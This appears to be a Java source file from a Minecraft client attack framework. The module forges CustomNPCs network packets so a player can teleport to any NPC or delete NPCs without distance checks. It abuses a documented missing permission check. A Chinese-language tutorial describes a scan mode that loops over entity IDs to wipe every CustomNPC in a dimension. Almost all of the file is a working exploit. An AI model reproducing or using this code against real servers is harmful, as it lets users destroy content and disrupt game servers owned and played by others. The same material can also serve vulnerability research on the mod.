package com.redblue.red.modules.customnpcs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CNPC-03: Remote NPC Operations -- delete or teleport to any NPC without distance check.
 *
 * Vuln #7 (index 119): SPacketRemoteNpcDelete
 *   Wire: writeInt(entityId)
 *   Requires: wand tool + NPC_DELETE permission. No distance check.
 *   Handler: level.getEntity(id) -> instanceof EntityNPCInterface -> npc.delete()
 *
 * Vuln #8 (index 122): SPacketRemoteNpcTp
 *   Wire: writeInt(entityId)
 *   Requires: wand tool (default toolAllowed). NO permission check (getPermission=null).
 *   Handler: level.getEntity(id) -> instanceof EntityNPCInterface -> player.teleport(npc.pos)
 */
public class CNPC03_RemoteNpc implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("customnpcs", "packets");
    private static final int IDX_REMOTE_NPC_DELETE = 119;
    private static final int IDX_REMOTE_NPC_TP = 122;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("action", "操作", "TELEPORT", "TELEPORT", "DELETE"),
        ConfigParam.ofEntity("entity_id", "目标NPC实体"),
        ConfigParam.ofBool("scan_mode", "扫描模式(遍历ID)", false),
        ConfigParam.ofInt("scan_start", "扫描起始ID", 0, 0, 2147483647)
                .visibleWhen("scan_mode", "true"),
        ConfigParam.ofInt("scan_end", "扫描结束ID", 1000, 1, 2147483647)
                .visibleWhen("scan_mode", "true"),
        ConfigParam.ofInt("scan_batch", "每次扫描批量", 50, 1, 200)
                .visibleWhen("scan_mode", "true"),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 5, 1, 200)
    );

    private long lastTick = 0;
    private int scanCursor = 0;

    @Override public String id() { return "cnpc03_remote_npc"; }
    @Override public String name() { return "远程NPC操作"; }
    @Override public String description() { return "无距离限制传送到NPC或删除NPC"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 手持 CustomNPCs wand\n"
            + "2. 选择操作: TELEPORT(传送到NPC) 或 DELETE(删除NPC)\n"
            + "3. 用准星选取目标NPC,或手动输入实体ID\n"
            + "4. 点击执行\n\n"
            + "[扫描模式]\n"
            + "开启扫描模式后,会遍历指定ID范围,\n"
            + "对每个ID发送操作包。服务端会自动过滤非NPC实体。\n"
            + "DELETE扫描可清除整个维度的所有CustomNPC。\n\n"
            + "[权限要求]\n"
            + "TELEPORT: 仅需wand,无权限检查\n"
            + "DELETE: 需wand + NPC_DELETE权限";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("customnpcs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        boolean scan = getParam("scan_mode").map(ConfigParam::getBool).orElse(false);

        if (scan) {
            int start = getParam("scan_start").map(ConfigParam::getInt).orElse(0);
            int end = getParam("scan_end").map(ConfigParam::getInt).orElse(1000);
            int batch = getParam("scan_batch").map(ConfigParam::getInt).orElse(50);
            String action = getParam("action").map(ConfigParam::getString).orElse("TELEPORT");

            for (int i = start; i <= end && i < start + batch; i++) {
                sendAction(action, i);
            }
        } else {
            int entityId = getParam("entity_id").map(ConfigParam::getInt).orElse(0);
            if (entityId == 0) return;
            String action = getParam("action").map(ConfigParam::getString).orElse("TELEPORT");
            sendAction(action, entityId);
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        boolean scan = getParam("scan_mode").map(ConfigParam::getBool).orElse(false);
        if (!scan) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(5);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        int start = getParam("scan_start").map(ConfigParam::getInt).orElse(0);
        int end = getParam("scan_end").map(ConfigParam::getInt).orElse(1000);
        int batch = getParam("scan_batch").map(ConfigParam::getInt).orElse(50);
        String action = getParam("action").map(ConfigParam::getString).orElse("TELEPORT");

        if (scanCursor < start) scanCursor = start;

        for (int i = 0; i < batch && scanCursor <= end; i++, scanCursor++) {
            sendAction(action, scanCursor);
        }

        if (scanCursor > end) {
            scanCursor = start; // loop
        }
    }

    private void sendAction(String action, int entityId) {
        int idx = "DELETE".equals(action) ? IDX_REMOTE_NPC_DELETE : IDX_REMOTE_NPC_TP;
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(idx);
            buf.writeInt(entityId);
        });
    }
}
